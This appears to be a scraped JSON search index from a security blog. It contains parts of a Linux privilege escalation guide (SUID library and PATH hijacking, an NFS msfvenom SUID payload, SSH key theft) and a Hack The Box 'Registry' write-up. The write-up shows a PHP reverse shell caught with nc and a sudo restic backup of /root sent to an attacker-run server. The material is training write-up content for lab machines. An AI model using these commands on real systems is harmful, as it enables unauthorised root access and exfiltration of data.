strace /usr/local/bin/suid-so 2\u003e\u00261 | grep -iE \"open|access|no such file\" Now, after running this we can see that shared object is loaded in our home directory but can’t be found. So we can create that executables and the spawn a bash shell. root@gr4n173:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c Finally running the executables again we spawn the root shell. ","date":"2021-05-02","objectID":"/linuxprivsec/:6:2","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Environment Variables Here we exploit the executables due to it inheriting the user’s PATH environment variable and attempting to execute programs without specifying an absolute path. Lets take an example if service executable is being called to start the webserver, however full path isn’t used then we can use the executable called service and spawn the Bash shell. root@gr4n173:~$ gcc -o service /home/user/file/service.c $ Service code int main() { setuid(0); system(\"/bin/bash -p\"); } Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell: PATH=.:$PATH /usr/local/bin/suid-env ","date":"2021-05-02","objectID":"/linuxprivsec/:6:3","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"6. NFS Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user. Check the NFS share configuration on the Debian VM: root@gr4n173:~$ cat /etc/exports Note that the /tmp share has root squashing disabled. On your Kali box, switch to your root user if you are not already running as root: root@gr4n173:~$ sudo su Using Kali’s root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly): root@gr4n173:~$ mkdir /tmp/nfs root@gr4n173:~$ mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs Still using Kali’s root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash): root@gr4n173:~$ msfvenom -p linux/x86/exec CMD=\"/bin/bash -p\" -f elf -o /tmp/nfs/shell.elf Still using Kali’s root user, make the file executable and set the SUID permission: root@gr4n173:~$ chmod +xs /tmp/nfs/shell.elf Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell: root@gr4n173:~$ /tmp/shell.elf ","date":"2021-05-02","objectID":"/linuxprivsec/:7:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"7. Password\u0026Keys ","date":"2021-05-02","objectID":"/linuxprivsec/:8:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"config Files Sometimes the creator leave the credentials and keys inside the files so we have to check everypart of the directory. ","date":"2021-05-02","objectID":"/linuxprivsec/:8:1","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"History Files Sometimes password may be typed in their command line by users. root@gr4n173:~$ cat ~/.*history.txt | less ","date":"2021-05-02","objectID":"/linuxprivsec/:8:2","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"SSH Keys Sometimes user makes the backups of important files but fail to secure them with correct permissions. So looking for hidden files \u0026 directories in the system root. root@gr4n173:~$ ls -al / From there we found the ssh_key which can be used to ssh into root root@gr4n173:~$ chmod 600 ssh_key_of_root Ssh command to sshing into root. root@gr4n173:~$ ssh -i ssh_key_of_root root@10.10.13.123 ","date":"2021-05-02","objectID":"/linuxprivsec/:8:3","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["moee"],"content":"This is my first vulnerable box ","date":"0001-01-01","objectID":"/moee-1/","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"Details about the first part of Moee Series. ","date":"0001-01-01","objectID":"/moee-1/:0:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"1 Download link You can download here: Moee-1. ","date":"0001-01-01","objectID":"/moee-1/:1:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["moee"],"content":"2 Details about Box You can visit this link from vulnhub to get the detail information about this box here. Below is the published tweet about it. Hello folks, Finally my box is published on @VulnHub and thanks vulnhub for making this public. You can check this out. Feedback is really appricated. At last but not least I would like to give a huge shout out to @DCAU7 for helping me this out. https://t.co/Ie69rVmhXz — gr4n173 (@gr4n173) December 2, 2020 ","date":"0001-01-01","objectID":"/moee-1/:2:0","tags":["project"],"title":"Moee-1","uri":"/moee-1/"},{"categories":["hackthebox"],"content":"Here I will explain my path for Registry box from Hack The Box.","date":"2020-04-04","objectID":"/registery/","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Registry box was the hard box. It falls under linux and hard category.Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. ","date":"2020-04-04","objectID":"/registery/:0:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"HTB:Registry Registry box was the hard box. It falls under linux and hard category. Especially to read the root flag was a quite tough one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting the docker registry page where I got the id_rsa key and password. For root, I got the www-data shell by exploiting CSRF TO RCE then with that shell I downloaded the backups files with restic-service and got a root.txt. I’ll show all my payload(including that didn’t work in initial deployment to get the root). ","date":"2020-04-04","objectID":"/registery/:1:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Box Details In the above picture it’s IP was 10.10.10.159 and added it to /etc/hosts as registry.htb. Let’s solve this box. ","date":"2020-04-04","objectID":"/registery/:2:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Recon Let’s start with our universal port scanner, nmap to see the open port and which shows port SSH(22), HTTP(TCP 80) and SSL(TCP 443). root@gr4n173:~$ nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 # Nmap 7.80 scan initiated Thu Oct 24 22:03:45 2019 as: nmap -sS -sV -sC -Pn -oA nmap.txt 10.10.10.159 Nmap scan report for 10.10.10.159 Host is up (0.30s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Welcome to nginx! | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 24 22:04:44 2019 -- 1 IP address (1 host up) scanned in 58.92 seconds ","date":"2020-04-04","objectID":"/registery/:3:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration registry.htb As soon as I saw port 80 opened I visited the site and got below as output. Now as usual for website I we usually searched for dir so I searched dirsearch tool as . root@gr4n173:~$ ./dirsearch.py -e html,txt,php,pcap,tar,bzip -u http://registry.htb/ -w ~/Downloads/wo rdlists/SecLists/Discovery/Web-Content/raft-large-directories.txt _|. _ _ _ _ _ _|_ v0.3.8 (_||| _) (/_(_|| (_| ) Extensions: html, txt, php, pcap, tar, bzip | Threads: 10 | Wordlist size: 62279 Error Log: /home/bikram/bbek/recon_tool/dirsearch/logs/errors-20-04-02_20-42-51.log Target: http://registry.htb/ [20:42:51] Starting: [20:42:54] 301 - 194B - /install -\u003e http://registry.htb/install/ [20:46:22] 200 - 612B - /bolt Task Completed and got the dir /bolt and /install. Fig: /bolt Fig: /install ","date":"2020-04-04","objectID":"/registery/:4:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Subdomain Enumeration As the given was http but looked over https too. In order to find the interesting things I usually use nikto tool. So I used it here too and got the subdomain as docker.registry.htb root@gr4n173:~$ nikto -h https://10.10.10.159 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.159 + Target Hostname: 10.10.10.159 + Target Port: 443 --------------------------------------------------------------------------- + SSL Info: Subject: /CN=docker.registry.htb Ciphers: ECDHE-RSA-AES256-GCM-SHA384 Issuer: /CN=Registry + Start Time: 2020-04-02 21:44:11 (GMT5.75) --------------------------------------------------------------------------- + Server: nginx/1.14.0 (Ubuntu) + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The site uses SSL and Expect-CT header is not present. + No CGI Directories found (use '-C all' to force check all possible dirs) + Hostname '10.10.10.159' does not match certificate's names: docker.registry.htb + The Content-Encoding header is set to \"deflate\" this may mean that the server is vulnerable to the BREACH attack. + OSVDB-3092: /install/: This might be interesting... + 7876 requests: 8 error(s) and 5 item(s) reported on remote host + End Time: 2020-04-03 00:49:25 (GMT5.75) (11114 seconds) --------------------------------------------------------------------------- + 1 host(s) tested ","date":"2020-04-04","objectID":"/registery/:4:1","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Docker Registry Exploit Then I found the dir with dirsearch as http://docker.registry.htb/v2/ and able to login with creds admin:admin. So I googled about it and found the interesting blog which explain how can we exploit the docker registry to download the stored files. You can find it here. Then I used this blog to exploit the docker registry and downloaded the file as root@gr4n173:~$ curl --user \"admin:admin\" http://docker.registry.htb/v2/bolt-image/manifests/latest [80/311] { \"schemaVersion\": 1, \"name\": \"bolt-image\", \"tag\": \"latest\", \"architecture\": \"amd64\", \"fsLayers\": [ { \"blobSum\": \"sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b\" }, { \"blobSum\": \"sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee\" }, { \"blobSum\": \"sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c\" }, { \"blobSum\": \"sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7\" }, { \"blobSum\": \"sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791\" }, { \"blobSum\": \"sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4\" }, { \"blobSum\": \"sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0\" }, { \"blobSum\": \"sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a\" }, { \"blobSum\": \"sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797\" }, { \"blobSum\": \"sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff\" } From above I saw the files name which start with sha256 and downloaded to my local machine as zip file and unzipped it. After all I found interesting folder name with file 01-ssh.ssh sha256_302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b and got this as output. #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \"Enter passphrase for /root/.ssh/id_rsa:\" send \"GkOcz221Ftb3ugog\\n\"; expect \"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\" interact this way I got the passphraase and id_rsa and able to ssh in as bolt. root@gr4n173:~$ ssh -i id_rsa bolt@registry.htb The authenticity of host 'registry.htb (10.10.10.159)' can't be established. ECDSA key fingerprint is SHA256:G1J5ek/T6KuCCT7Xp2IN1LUslRt24mhmhKUo/kWWVrs. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added 'registry.htb' (ECDSA) to the list of known hosts. Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Fri Apr 3 07:54:40 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 6.1% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 49% IP address for docker0: 172.17.0.1 Swap usage: 0% IP address for br-1bad9bd75d17: 172.18.0.1 Processes: 157 Last login: Fri Apr 3 06:36:39 2020 from 10.10.14.18 bolt@bolt:~$ whoami bolt bolt@bolt:~$ cat user.txt ytc0yt*************** This way I got the user bolt. ","date":"2020-04-04","objectID":"/registery/:4:2","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"To Root ","date":"2020-04-04","objectID":"/registery/:5:0","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Web Enumeration After a lot of dir search with different wordlist I finally got the login page of bolt cms site as. Fig: Login Page then I searched everypart of the bolt shell and got the hash in dir /var/www/html/app/database/bolt.db and on cat I got the hash $2y$10$e.ChUytg9SrL7AsboF2bX .wWKQ1LkS5Fi/Z0yYD86.P5E9cpY7P. Now I used john to crack the hash and got the password strawberry. root@gr4n173:~$ john hash -wordlist=/usr/share/wordlists/rockyou.txt [sudo] password for bikram: Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status strawberry (?) 1g 0:00:00:05 DONE (2020-04-03 14:02) 0.1992g/s 71.71p/s 71.71c/s 71.71C/s strawberry..brianna Use the \"--show\" option to display all of the cracked passwords reliably Session completed I used that creds(admin:strawerry) and logged in bolt cms. Fig: Admin User ","date":"2020-04-04","objectID":"/registery/:5:1","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Unprivileged User After logged in, I searched every part of cms and found the file upload field where I was unable to upload the php file. Since I was admin edited and added php extension in file config.yml which was located at url http://registry.htb/bolt/bolt/file/edit/config/config.yml with a php-reverse-shell.php and listener on. I found one interesting blog CSRF-TO-RCE you can read it. Fig: Uploaded File Listner on: root@gr4n173:~$ nc -lvnp 8888 listneing on [any] 8888 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58100 Linux bolt 4.15.0-65-generic #74-Ubuntu SMP Tue Sep 17 17:06:04 UTC x86_64 uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0 can't access tty;job contorl turned off $ $python -c \"import pty;pty.spawn('/bin/bash')\" www-data@bolt:$ sudo -l Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest* As, I saw the restic server running as root then searched for files and got backup.php www-data@bolt:/var/www/html$ cat backup.php \u003c?php shell_exec(\"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt\"); Restic Server Then I searched about restic server and collected knowledge you can find here and at first I download to my localhost then started the restic server as you can find file rest-server. root@gr4n173:~$ rest-server --path . --no-auth Data directory: . Authentication disabled Private repositories disabled Starting server on:8000 Creating repository directories in . Creating repository directories in . Now before directly using the rest-server in machine I used and in my local machine and it worked. root@gr4n173:~$ restic -r http://10.10.14.129:8000 init enter password for new repository: enter password again: created restic repository 39fcbee204 at rest:http://10.10.14.129:8000 Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irreversibly lost. Port Forwarding After, it worked in my local machine I port forward from 8000 to 1234 ( this willn’t work if your python is active at 8000 then it will route to another port ). root@gr4n173:~$ ssh bolt@10.10.10.159 -i id_rsa -R 1234:127.0.0.1:8000 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Nov 11 14:1018 UTC 2019 System Load: 0.02 Users logged in: 1 Usage of /: 6.5% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 53% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 1% IP address of docker0: 172.17.0.1 Processes: 206 =\u003e There is 1 zombies process. Last Login: Mon Nov 11 14:1018 2019 from 10.10.15.129 bolt@bolt:~$whoami bolt At first I used the full directory of restic server but that doesn’t work so I used below command in www-data shell ","date":"2020-04-04","objectID":"/registery/:5:2","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":["hackthebox"],"content":"Rest-Server Backup Files www-data@bolt:~$ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ sudo restic backup -r rest:http://127.0.0.1:1234 /root/ enter password for repository: something password is correct found 1 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to scan [/root] scanned 18 directories, 19 files in 0:00 [0:03] 100.00% 39.690 KiB / 39.690 KiB 37 /37 items 0 errors ETA 0:00 duration: 0:03 snapshot 4bf1b3af saved Finally I restored and checked the restic server directory and got the files as root@gr4n173:~$ restic restore 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 enter password for repository: repository 39fcbee2 opened succesfully, password is correct created new cache in /root/.cache/restic restorying \u003cSnapshot 4bf1b3af of [/root] at 2019-11-11 14:13:38.38.895820081 +0000 UTC \u003e root@bolt to . Then I checked back to the folder snapshot and got the root.txt root@gr4n173:~/snapshots$ ls 4bf1b3af915544c9d15d4aa741731382c9fd2dc68ffec7f769a237aaf52c2c02 root root@gr4n173:~/snapshots$ cd root root@gr4n173:~/snapshots/root$ ls config.yml cron.sh root.txt root@gr4n173:~/snapshots/root$ cat root.txt ntrkz********************* This way I got the root of Registry box and learned alot from this box. So I would like to thank creator of this box thek for such an awesome box. Especially downloading the backup files from restic server was new one. I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. Feedback are really appreciated !! Tweet about this writeup if you like. You can see more blog at my medium here: gr4n173. ","date":"2020-04-04","objectID":"/registery/:5:3","tags":["htb"],"title":"Hack The Box: Registry","uri":"/registery/"},{"categories":null,"content":"Hi! I’m gr4n173 an Security Enthusiast and a python programmer from beautiful country Nepal. I m a nature admire who love to travel and enjoy the beauty of nature. As by profession I m an Electircal Engineer but I love everything in between Internet and Security related suff. ","date":"2020-01-02","objectID":"/about/:0:0","tags":null,"title":"About Me","uri":"/about/"}]